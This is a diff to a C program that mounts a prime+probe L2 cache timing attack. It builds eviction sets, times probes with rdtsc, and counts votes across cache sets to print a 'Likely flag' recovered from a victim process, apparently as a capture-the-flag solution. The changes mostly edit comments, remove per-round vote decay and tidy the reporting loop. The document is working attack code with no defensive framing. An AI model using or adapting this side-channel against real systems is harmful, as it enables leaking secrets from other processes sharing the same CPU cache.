@@ -11,8 +11,7 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 1000          // reduced from 3000 for faster rounds
-#define VOTE_DECAY 0.9        // decay factor for older votes
+#define REPEATS 1000          // number of prime-probe repetitions per round
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
@@ -26,13 +25,13 @@ static inline uint64_t rdtsc() {
     return ((uint64_t)hi << 32) | lo;
 }
 
-// Wait for approximate cycles
+// Wait for approximate CPU cycles
 static inline void wait_cycles(uint64_t cycles) {
     uint64_t start = rdtsc();
     while (rdtsc() - start < cycles);
 }
 
-// Fisher-Yates shuffle
+// Fisher-Yates shuffle for random access
 void shuffle(int *arr) {
     for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
         int j = rand() % (i + 1);
@@ -42,7 +41,7 @@ void shuffle(int *arr) {
     }
 }
 
-// Helper: compute median of array
+// Compute median to ignore low-latency noise
 uint64_t median(uint64_t *arr, int n) {
     uint64_t temp[n];
     for(int i = 0; i < n; i++) temp[i] = arr[i];
@@ -57,7 +56,6 @@ uint64_t median(uint64_t *arr, int n) {
         }
         temp[j+1] = key;
     }
-
     return temp[n/2];
 }
 
@@ -77,6 +75,7 @@ int main() {
     }
     *((char*)buf) = 1;
 
+    // initialize eviction sets
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         for(int w = 0; w < WAYS; w++) {
             eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
@@ -89,7 +88,7 @@ int main() {
     int votes[NUM_L2_CACHE_SETS] = {0};
     int rounds = 0;
 
-    // initial sample to estimate victim duration
+    // estimate victim duration
     uint64_t sample_wait = 0;
     for(int s = 0; s < 5; s++) {
         uint64_t start = rdtsc();
@@ -142,30 +141,27 @@ int main() {
             }
         }
 
-        // decay old votes slightly
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++) votes[i] = (int)(votes[i]*VOTE_DECAY);
-
+        // increment vote for detected set
         votes[best_set]++;
         rounds++;
 
+        // occasional decay to prevent old votes from dominating
         if(rounds % 50 == 0){
-        for(int i=0;i<NUM_L2_CACHE_SETS;i++)
-            votes[i] /= 2;
-        }   
-
-        if(rounds % 5 == 0) {
-
-            int likely_flag = 0;
-            int max_votes = 0;
-
-        for(int i=0;i<NUM_L2_CACHE_SETS;i++){
-            if(votes[i] > max_votes){
-                max_votes = votes[i];
-                likely_flag = i;
-            }
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
+                votes[i] /= 2;
         }
 
-    printf("Likely flag: %d (votes=%d)\n", likely_flag, max_votes);
+        // print likely flag every 5 rounds
+        if(rounds % 5 == 0) {
+            int likely_flag = 0;
+            int max_votes = 0;
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+                if(votes[i] > max_votes){
+                    max_votes = votes[i];
+                    likely_flag = i;
+                }
+            }
+            printf("Likely flag: %d (votes=%d)\n", likely_flag, max_votes);
         }
     }
 
